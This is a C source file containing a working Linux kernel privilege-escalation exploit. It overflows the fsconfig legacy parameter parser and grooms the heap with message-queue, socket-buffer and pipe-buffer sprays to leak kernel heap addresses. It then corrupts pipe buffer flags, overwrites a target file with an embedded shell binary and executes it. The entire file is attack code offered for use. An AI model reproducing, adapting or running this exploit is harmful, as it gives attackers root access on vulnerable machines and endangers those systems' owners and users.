#include "util.h"
#include <fcntl.h>

#ifndef PAGE_SIZE
#define PAGE_SIZE 4096
#endif
#ifndef __NR_fsconfig
#define __NR_fsconfig 431
#endif
#ifndef __NR_fsopen
#define __NR_fsopen 430
#endif
#define fsopen(name, flags) syscall(__NR_fsopen, name, flags)
#define fsconfig(fd, cmd, key, value, aux) syscall(__NR_fsconfig, fd, cmd, key, value, aux)

#define NUM_MSQIDS (0x800)
int msqid[NUM_MSQIDS];
#define NUM_MSQIDS_1 (0x400)
#define NUM_MSQIDS_2 (0x400)
int msqid_1[NUM_MSQIDS_1];
int msqid_2[NUM_MSQIDS_2];


#define NUM_SOCKETS (4)
#define NUM_SKBUFFS (0x80)
int sock_pairs[NUM_SOCKETS][2];

void init_sock() {

    for (int i = 0; i < NUM_SOCKETS; i++) 
        testsocketpair(AF_UNIX, SOCK_STREAM, 0, sock_pairs[i]);
}

int call_fsopen() {
    int fd = fsopen("ext4", 0);
    if (fd < 0) {
        die("fsopen()");
    }
    return fd;
}

#define MTYPE_A (0x41)
#define MTYPE_B (0x42)
#define MTYPE_FAKE (0x43)
#define MSG_A_RAW_SIZE (0x1400)
#define MSG_B_RAW_SIZE (0x400)
#define MSG_A_TEXT_SIZE MSG_TEXT_SIZE(MSG_A_RAW_SIZE)
#define MSG_B_TEXT_SIZE MSG_TEXT_SIZE(MSG_B_RAW_SIZE)
#define MSG_SIG (0x13371337)
#define HOLE_STEP (0x100)
#define FSCONFIG_SET_STRING 1
uint8_t msg_buffer[0x2000];
msg *msg_a = (msg *)msg_buffer;
msg *msg_a_oob = (msg *)msg_buffer;
msg *msg_b = (msg *)msg_buffer;
int list1_corrupted_msqid = -1;
int list2_leak_msqid = -1;
int list2_leak_mtype = 0;
uint64_t list2_uaf_msg_addr = 0;
int list2_uaf_mtype = 0;
uint64_t heap_buffer_addr = 0;

void clean_msq_1() {
    for (int i = 0; i < NUM_MSQIDS_1; i++) {
        msgrcv(msqid_1[i], msg_a, MSG_A_TEXT_SIZE, MTYPE_A, IPC_NOWAIT);
    }
}
void clean_msq_2() {
    for (int i = 0; i < NUM_MSQIDS_2; i++) {
        for (int j = 0; j < 0x10; j++) {
            msgrcv(msqid_2[i], msg_b, MSG_B_TEXT_SIZE, MTYPE_B | (j << 8), IPC_NOWAIT);
        }
    }
}

uint64_t exploit_step1(int fd) {
    char buff[0x1000];
    logd("prepare fsconfig heap overflow");
    
    memset(buff, 0, sizeof(buff));
    memset(buff, 'A', 0x100 - 2);
    for (int i = 0; i < 0xf; i++) {
        fsconfig(fd, FSCONFIG_SET_STRING, "\x00", buff, 0);
    }
    memset(buff, 0, sizeof(buff));
    memset(buff, 'B', 0x100 - 3);
    fsconfig(fd, FSCONFIG_SET_STRING, "\x00", buff, 0);
    
    // alloc msg_msg with 0x1000(-0x30) body and 0x400(-0x08) msg_msgseg
    logd("sparying msg_msg ...");
    for (int i = 0; i < NUM_MSQIDS_1; i++) {
        msg_a->mtype = MTYPE_A;
        memset(msg_a->mtext, 'Q', MSG_A_TEXT_SIZE);
        ((int *)msg_a->mtext)[0] = MSG_SIG;
        testmsgsnd(msqid_1[i], msg_a, MSG_A_TEXT_SIZE, 0);
    }

    logd("trigger oob write in `legacy_parse_param` to corrupt msg_msg.m_ts");
    memset(buff, 0, sizeof(buff));
    strcat(buff, "0000000");  // m_list_next
    strcat(buff, "11111111"); // m_list_prev
    strcat(buff, "22222222"); // m_type
    uint64_t target_size = MSG_TEXT_SIZE(MSG_A_RAW_SIZE + 0x400);
    memcpy(buff + strlen(buff), &target_size, 2);//m_ts
    fsconfig(fd, FSCONFIG_SET_STRING, "\x00", buff, 0);

    // recv from buffer to see if leak success
    logd("search corrupted msg_msg ...");
    for (int i = 0; i < NUM_MSQIDS_1; i++) {
        if(i%HOLE_STEP == 0)
            continue;
        ssize_t copy_size = testmsgrcv(msqid_1[i], msg_a_oob, MSG_TEXT_SIZE(MSG_A_RAW_SIZE + 0x400), 0, MSG_COPY | IPC_NOWAIT);

        if (copy_size == MSG_TEXT_SIZE(MSG_A_RAW_SIZE + 0x400)) {
            logd("corrupted msg_msg found, id: %d", msqid_1[i]);
            list1_corrupted_msqid = msqid_1[i];
            msqid_1[i] = testmsgget(IPC_PRIVATE, IPC_CREAT | 0666);
            uint64_t *oob_data = (uint64_t *)(msg_a_oob->mtext + MSG_A_TEXT_SIZE);
            size_t oob_size = MSG_TEXT_SIZE(MSG_A_RAW_SIZE + 0x400) - MSG_A_TEXT_SIZE;
            if (memcmp(&oob_data[1], "QQQQQQQQ", 8)) { // 'QQQQQQQQ'
                die("but the next object is not allocated by msg_msgseg");
            }
            //hexdump(oob_data, 0x40);
            break;
        }
    }
    if (list1_corrupted_msqid < 0) {
        loge("can't found corrupted msg_msg, and kernel may crash :(");
        clean_msq_1();
        return 1;
    }
    clean_msq_1();
    logd("alloc `msg_msg` to re-acquire the 0x400 slab freed by msg_msgseg ...");
    for (int i = 0; i < NUM_MSQIDS_2; i++) {
        memset(msg_b->mtext, 'W', MSG_B_TEXT_SIZE);
        ((int *)msg_b->mtext)[0] = MSG_SIG;
        ((int *)msg_b->mtext)[1] = i;
        for (int j = 0; j < 0x10; j++) {
            msg_b->mtype = MTYPE_B | (j << 8);
            testmsgsnd(msqid_2[i], msg_b, MSG_B_TEXT_SIZE, 0);
        }
    }
    // hope leak happen
    {
        ssize_t copy_size = testmsgrcv(list1_corrupted_msqid, msg_a_oob, MSG_TEXT_SIZE(MSG_A_RAW_SIZE + 0x400), 0, MSG_COPY | IPC_NOWAIT);
        if (copy_size != MSG_TEXT_SIZE(MSG_A_RAW_SIZE + 0x400)) {
            die("recv from corrupted msg_msg failed");
        }
        uint64_t *oob_data = (uint64_t *)(msg_a_oob->mtext + MSG_A_TEXT_SIZE);
        size_t oob_size = MSG_TEXT_SIZE(MSG_A_RAW_SIZE + 0x400) - MSG_A_TEXT_SIZE;
        msg_msg *p = (msg_msg *)oob_data;
        if (((int *)&p->mtext)[0] != MSG_SIG) {
            loge("bad luck, we don't catch 0x400 msg_msg");
            clean_msq_2();
            return 1;
        }
        logd("it works :)");

        list2_leak_msqid = msqid_2[((int *)&p->mtext)[1]];
        list2_leak_mtype = p->m_type;
        list2_uaf_msg_addr = p->m_list_prev;
        list2_uaf_mtype = p->m_type - 0x0100;
        msqid_2[((int *)&p->mtext)[1]] = msgget(IPC_PRIVATE, IPC_CREAT | 0666);
        //hexdump(msg_a_oob->mtext + MSG_A_TEXT_SIZE, 0x40);
        logi("leak list2_leak_msqid: %d", list2_leak_msqid);
        logi("leak list2_leak_mtype: 0x%x", list2_leak_mtype);
        logi("leak list2_uaf_msg_addr: 0x%lx", list2_uaf_msg_addr);
        logi("leak list2_uaf_mtype: 0x%x", list2_uaf_mtype);
    }

    logd("alloc msg_msg as heap buffer with known address");
    {
        for (int j = ((list2_leak_mtype + 0x100) >> 8); j < 0x10; j++) 
            testmsgrcv(list2_leak_msqid, msg_b, MSG_B_TEXT_SIZE, MTYPE_B | (j << 8), IPC_NOWAIT);
        
        memset(buff, 0, sizeof(buff));
        msg_msg *p = (msg_msg *)buff;
        p->m_list_next = list2_uaf_msg_addr;
        p->m_list_prev = 0xdeadbeefdeadbeef;
        p->m_type = MTYPE_A;

        memcpy(msg_b->mtext, buff, MSG_B_TEXT_SIZE);
        msg_b->mtype = MTYPE_B;
        testmsgsnd(list2_leak_msqid, msg_b, MSG_B_TEXT_SIZE, 0);
    }

    logd("fetch heap_buffer address by oob read again");
    {
        ssize_t copy_size = testmsgrcv(list1_corrupted_msqid, msg_a_oob, MSG_TEXT_SIZE(MSG_A_RAW_SIZE + 0x400), 0, MSG_COPY | IPC_NOWAIT);
        if (copy_size != MSG_TEXT_SIZE(MSG_A_RAW_SIZE + 0x400)) {
            die("Recv from corrupted msg_msg failed");
        }
        uint64_t *oob_data = (uint64_t *)(msg_a_oob->mtext + MSG_A_TEXT_SIZE);
        size_t oob_size = MSG_TEXT_SIZE(MSG_A_RAW_SIZE + 0x400) - MSG_A_TEXT_SIZE;
        msg_msg *p = (msg_msg *)oob_data;
        if (((int *)&p->mtext)[0] != MSG_SIG) {
            die("I don't think this can happen");
        }
        heap_buffer_addr = p->m_list_next + sizeof(msg_msg);
        logi("heap_buffer_addr: 0x%lx", heap_buffer_addr);
        if (strlen((char *)&heap_buffer_addr) < 8) {
            die("pointer can't contain 0x00 bytes");
        }
    }

    // clean uncorrupted msg_msg
    logd("clean unused msg_msg ...");
    clean_msq_2();

    return 0;
}

#define NUM_PIPES (0x100)
int pipes[NUM_PIPES][2];

void spray_skbuff_data(void *ptr, size_t size) {
    for (int i = 0; i < NUM_SOCKETS; i++) {
        for (int j = 0; j < NUM_SKBUFFS; j++) {
            testwrite(sock_pairs[i][0], ptr, size);
        }
    }
}

void free_skbuff_data(void *ptr, size_t size) {
    for (int i = 0; i < NUM_SOCKETS; i++) {
        for (int j = 0; j < NUM_SKBUFFS; j++) {
            testread(sock_pairs[i][1], ptr, size);
        }
    }
}

int exploit_step2(int fd) {
    char buff[0x1000];

    logd("prepare fsconfig heap overflow");
    memset(buff, 0, sizeof(buff));
    memset(buff, 'A', 0x100 - 2);
    for (int i = 0; i < 0xf; i++) {
        fsconfig(fd, FSCONFIG_SET_STRING, "\x00", buff, 0);
    }
    memset(buff, 0, sizeof(buff));
    memset(buff, 'B', 0x100 - 3);
    fsconfig(fd, FSCONFIG_SET_STRING, "\x00", buff, 0);

    // alloc msg_msg with 0x1000(-0x30) body and 0x400(-0x08) msg_msgseg
    logd("sparying msg_msg ...");
    for (int i = 0; i < NUM_MSQIDS_1; i++) {
        msg_a->mtype = MTYPE_A;
        memset(msg_a->mtext, 'Q', MSG_A_TEXT_SIZE);
        ((int *)msg_a->mtext)[0] = MSG_SIG;
        ((int *)msg_a->mtext)[1] = i;
        testmsgsnd(msqid_1[i], msg_a, MSG_A_TEXT_SIZE, 0);
    }

    // trigger oob write to overwrite msg_msg.next (hopes)
    logd("trigger oob write in `legacy_parse_param` to corrupt msg_msg.next");
    memset(buff, 0, sizeof(buff));
    msg_msg *p = (msg_msg *)buff;
    p->m_list_next = heap_buffer_addr;
    p->m_list_prev = 0xdeadbeefdeadbeef;
    p->m_type = MTYPE_A; // with '=' appended
    fsconfig(fd, FSCONFIG_SET_STRING, buff, "\x00", 0);

    // free uaf msg_msg
    logd("free uaf msg_msg from correct msqid");
    testmsgrcv(list2_leak_msqid, msg_b, MSG_B_TEXT_SIZE, list2_uaf_mtype, 0);

    // spary skbuff_data to re-acquire uaf msg_msg and fake the header
    logd("spray skbuff_data to re-acquire the 0x400 slab freed by msg_msg");
    {
        memset(buff, 0, sizeof(buff));
        setMsgHead(buff, heap_buffer_addr + 0x80, heap_buffer_addr + 0x80, MTYPE_FAKE, 0x100, 0x0, 0x0);
        spray_skbuff_data(buff, 0x400 - 0x140);
    }

    // free uaf msg_msg
    logd("free skbuff_data using fake msqid");
    for (int i = 0; i < NUM_MSQIDS_1; i++) {
        if (msgrcv(msqid_1[i], msg_b, MSG_B_TEXT_SIZE, MTYPE_FAKE, IPC_NOWAIT) > 0) {
            logd("freed using msqid %d", i);
            break;
        }
    }

    // filled with pipe_buffer
    logd("spray pipe_buffer to re-acquire the 0x400 slab freed by skbuff_data");
    int attack_fd = testopen(targetFile, O_RDONLY);

    for (int i = 0; i < NUM_PIPES; i++) {
        testpipe(pipes[i]);

        const unsigned pipe_size = fcntl(pipes[i][1], F_GETPIPE_SZ);
        static char tmp_buff[4096];

        /* fill the pipe completely; each pipe_buffer will now have
           the PIPE_BUF_FLAG_CAN_MERGE flag */
        for (unsigned r = pipe_size; r > 0;) {
            unsigned n = r > sizeof(tmp_buff) ? sizeof(tmp_buff) : r;
            write(pipes[i][1], tmp_buff, n);
            r -= n;
        }

        /* drain the pipe, freeing all pipe_buffer instances (but
           leaving the flags initialized) */
        for (unsigned r = pipe_size; r > 0;) {
            unsigned n = r > sizeof(tmp_buff) ? sizeof(tmp_buff) : r;
            read(pipes[i][0], tmp_buff, n);
            r -= n;
        }

        write(pipes[i][1], buff, 0x100 + i);

        loff_t offset = 1;
        ssize_t nbytes = testsplice(attack_fd, &offset, pipes[i][1], NULL, 1, 0);
    }

    logd("free skbuff_data to make pipe_buffer become UAF");
    int uaf_pipe_idx = 0;
    char pipe_buffer_backup[0x280];
    {
        void *ptr = buff;
        uint64_t size = 0x400 - 0x140;
        for (int i = 0; i < NUM_SOCKETS; i++) {
            for (int j = 0; j < NUM_SKBUFFS; j++) {
                testread(sock_pairs[i][1], ptr, size);
                uint32_t test_size = ((uint32_t *)ptr)[3];
                if ((test_size >= 0x100) && (test_size < 0x100 + NUM_PIPES)) {
                    uaf_pipe_idx = test_size - 0x100;
                    logd("uaf_pipe_idx: %d", uaf_pipe_idx);
                    memcpy(pipe_buffer_backup, ptr, 0x280);
                }
            }
        }
    }
    
    logd("edit pipe_buffer->flags");
    {
        int anon_pipe_buf_ops=((uint64_t *)pipe_buffer_backup)[2];
        //hexdump(pipe_buffer_backup, 0x280);
        memset(buff, 0, sizeof(buff));
        memcpy(buff, pipe_buffer_backup, 0x280);
        ((uint64_t *)buff)[6] = 0;// offset | len
        ((uint64_t *)buff)[7] = anon_pipe_buf_ops;                       // offset | len
        ((uint64_t *)buff)[8] = PIPE_BUF_FLAG_CAN_MERGE; // flag
        spray_skbuff_data(buff, 0x400 - 0x140);
    }
    logd("try to overwrite %s", targetFile);
    {
        ssize_t nbytes = write(pipes[uaf_pipe_idx][1], shellElf, shellElfLen);
        if (nbytes < 0) {
            die("write failed");
        }
        if ((size_t)nbytes < shellElfLen) {
            die("short write");
        }
    }

    // clean
    close(pipes[uaf_pipe_idx][0]);
    close(pipes[uaf_pipe_idx][1]);
    for (int i = 0; i < NUM_MSQIDS_2; i++) {
        memset(msg_b->mtext, 0, MSG_B_TEXT_SIZE);
        msg_b->mtype = MTYPE_B;
        msgsnd(msqid_2[i], msg_b, MSG_B_TEXT_SIZE, 0);
    }
    return 0;
}


void main()
{
    initSyncPipe();
    if (!fork()) 
    {
        logi("STEP 0: init");
        getTargetFile();
        initUnshare();
        bindCpu();
        testMsqInit(msqid_1, NUM_MSQIDS_1);
        testMsqInit(msqid_2, NUM_MSQIDS_2);  
        init_sock();
        int fd;
        fd = call_fsopen();
        logi("STEP 1");
        while (exploit_step1(fd)) {
            logd("retry STEP 1");
            close(fd);
            fd = call_fsopen();
        }
        fd = call_fsopen();
        logi("STEP 1");
        while (exploit_step2(fd)) {
        logd("retry step2 ...");

        close(fd);
        fd = call_fsopen();
        }
        if(ifAtkSuccess() == true)
        {
            write(sync_pipe[1], "T", 1);
            while (1) 
            {
                sleep(10);
            }   
        }
    }
    else 
    {
        char sync;
        read(sync_pipe[0], &sync, 1);
        if (sync == 'T') 
        {
            logd("run mount");
            sleep(1);
            system(targetFile);
        }
    }

}